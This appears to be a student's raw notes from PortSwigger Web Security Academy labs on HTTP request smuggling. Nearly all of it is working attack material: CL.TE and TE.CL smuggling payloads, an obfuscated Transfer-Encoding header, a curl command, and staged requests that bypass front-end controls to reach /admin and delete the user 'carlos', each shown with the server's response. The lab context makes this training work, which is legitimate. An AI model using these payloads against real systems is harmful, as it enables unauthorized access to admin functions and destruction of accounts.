User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow 

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


 curl -i -s -k -X $'POST' \
    -H $'Host: ac801f3d1f912a9f808e426a00ba0031.web-security-academy.net' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Transfer-Encoding: chunked' -H $'Transfer-encoding: cow' -H $'Content-Length: 4' \
    --data-binary $'5c\x0d\x0aGPOST / HTTP/1.1\x0d\x0aContent-Type: application/x-www-form-urlencoded\x0d\x0aContent-Length: 15\x0d\x0a\x0d\x0ax=1\x0d\x0a0\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a' \
    $'https://ac801f3d1f912a9f808e426a00ba0031.web-security-academy.net/'

response

HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Connection: close
Keep-Alive: timeout=0
Content-Length: 29

"Unrecognized method 5CGPOST"



HTTP request smuggling, confirming a CL.TE vulnerability via differential responses



POST / HTTP/1.1
Host: exaaa.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses
Connection: close
Cookie: session=yCnIomLHwDm8Q0xf2uVEJGjsp0Lr9gIn
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X 

repsone the second req should be

HTTP/1.1 404 Not Found
Content-Type: application/json; charset=utf-8
Keep-Alive: timeout=0
Connection: close
Content-Length: 11

"Not Found"


HTTP request smuggling, confirming a TE.CL vulnerability via differential responses



POST / HTTP/1.1
Host: acbb1fc51e2f995d801507130018004a.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses
Connection: close
Cookie: session=1xXmOamVuYTjjbtoBodqqZzQijrrb5y1
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


response

HTTP/1.1 404 Not Found
Content-Type: application/json; charset=utf-8
Keep-Alive: timeout=0
Connection: close
Content-Length: 11

"Not Found"






Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability






POST / HTTP/1.1
Host: ac3d1fc71f126e19802f185700e600f5.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te
Connection: close
Cookie: session=wR55MKetVS8a4BLH3bK6Dd6cRGqLJc8w
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X-Ignore: X 



2-

Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=


3-


Content-Length: 140
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x= 


response


HTTP/1.1 302 Found
Location: /admin
Set-Cookie: session=cnuBaqYd7h805ga8N8YMPU3jGc1Q1KD3; Secure; HttpOnly
Keep-Alive: timeout=0
Connection: close
Content-Length: 0





Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

POST / HTTP/1.1
Host: exa.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl
Connection: close
Cookie: session=havgZfdYaJpiPFU4LFva4pkQNqW1iD9c
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

without host

Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

60
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


exploit

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


parses
application/json
application/x-www-form-urlencoded
multipart/form-data
